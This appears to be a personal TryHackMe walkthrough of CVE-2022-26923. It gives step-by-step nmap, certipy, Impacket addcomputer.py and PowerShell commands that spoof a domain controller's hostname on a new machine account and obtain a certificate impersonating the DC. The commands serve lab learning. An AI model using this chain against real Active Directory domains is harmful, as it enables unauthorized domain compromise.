Welcome to CVE-2022-26923 TryHackMe walkthrough. Today I decided to learn about Active Directory Certificate Service and I consider that this walkthorugh was a great occasion. I discovered certipy and practiced on nmap and Impacket's addcomputer.py.
üîó Link to the walkthorugh: https://tryhackme.com/r/room/cve202226923

üü° Difficulty: Easy

‚öôÔ∏è Tools:

- [nmap](https://www.kali.org/tools/nmap/),

- [Impacket](https://www.kali.org/tools/impacket/) ([addcomputer.py](https://www.kali.org/tools/impacket-scripts/#impacket-addcomputer)),

- [certipy](https://github.com/ly4k/Certipy)

üí≠ Note: $Target_IP= machine IP

üü¢ State of the write-up: Final


-------------------------------

ü™ú Steps I followed (after deploying the machine:

1. Add the DNS name and the machine IP in `/etc/hosts` 

2. Run an nmap scan
`nmap -A -Pn $Target_IP`


Ports 88 and 389 are open.


-88 is used for Kerberos authentication system

-389 is for making LDAP connections so users can access protected network resources. Connections made through this port are unencrypted.


3. Get the Enterprise CA name
  `certipy find -u thm@lunar.eruca.com -p Password1@ -dc-ip $Target_IP`

3. Test certificate generation

`certipy req -username thm@lunar.eruca.com -password Password1@ -ca LUNAR-LUNDC-CA -target $Target_IP`


4. Verify that this certificate is valid and can be used for Kerberos authentication

`certipy auth -pfx thm.pfx`


5. Add a Computer to the Domain

`python3 addcomputer.py 'lunar.eruca.com/thm:Password1@' -method LDAPS -computer-name 'THMPC' -computer-pass 'Password1@' -dc-ip $Target_IP`


6. Generate a certificate for the newly created computer

`certipy req -username THMPC$ -password Password1@ -ca LUNAR-LUNDC-CA -target $Target_IP -template Machine`


7. Verify that the certificate is valid

`certipy auth -pfx thmpc.pfx`


8. SSH into the machine

`ssh lunar.eruca.com\\thm@lundc`


9. Start Powershell

`powershell`


10. Get the current attributes from our Computer AD Object 

`Get-ADComputer THMPC -properties dnshostname,serviceprincipalname`


11. Update the DNS hostname attribute to that of the DC

`Set-ADComputer THMPC -ServicePrincipalName @{}`


12. Set the DNS hostname attribute to that of the DC

`Set-ADComputer THMPC -DnsHostName LUNDC.lunar.eruca.com`


13. Verify that the changes were made 

`Get-ADComputer THMPC -properties dnshostname,serviceprincipalname`



14. Forge a malicious certificate

  14a. Request a new certificate

`certipy req -username THMPC$ -password Password1@ -ca LUNAR-LUNDC-CA -target lundc.lunar.eruca.com -template Machine`

  14b. Verify the certificate

`certipy auth -pfx lundc.pfx`


And we have the flag!
